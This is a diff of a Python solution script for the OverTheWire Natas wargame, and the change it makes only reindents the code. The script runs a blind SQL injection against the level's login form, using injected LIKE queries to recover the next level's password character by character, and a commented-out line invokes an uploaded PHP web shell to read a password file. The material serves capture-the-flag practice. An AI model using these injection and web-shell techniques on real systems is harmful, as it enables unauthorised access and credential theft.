@@ -19,15 +19,15 @@ session = requests.Session()
 response = session.post(url, data = { "username": '" SELECT * FROM users WHERE name="natas16" and password="" or "1"="1" #', "password": "sql_injection" }, auth = (username, password))
 seen_password = list('WaIHEacj63wnNIBROHeqi3p9t0m5nhm')
 while(len(seen_password) < 32):
-    for ch in characters:
-        print("Trying with password", "".join(seen_password) + ch)
-        response = session.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" #' }, auth = (username, password))
+	for ch in characters:
+		print("Trying with password", "".join(seen_password) + ch)
+		response = session.post(url, data = { "username" : 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" #' }, auth = (username, password))
 
-        content = response.text
+		content = response.text
 
-        if('user exists' in content):
-            seen_password.append(ch)
-            break
+		if('user exists' in content):
+			seen_password.append(ch)
+			break
 
 response = requests.get(url, auth = (username, password))
 # response = session.get(url + "upload/uyqhobeodo.php?c=cat /etc/natas_webpass/natas14", auth = (username, password))
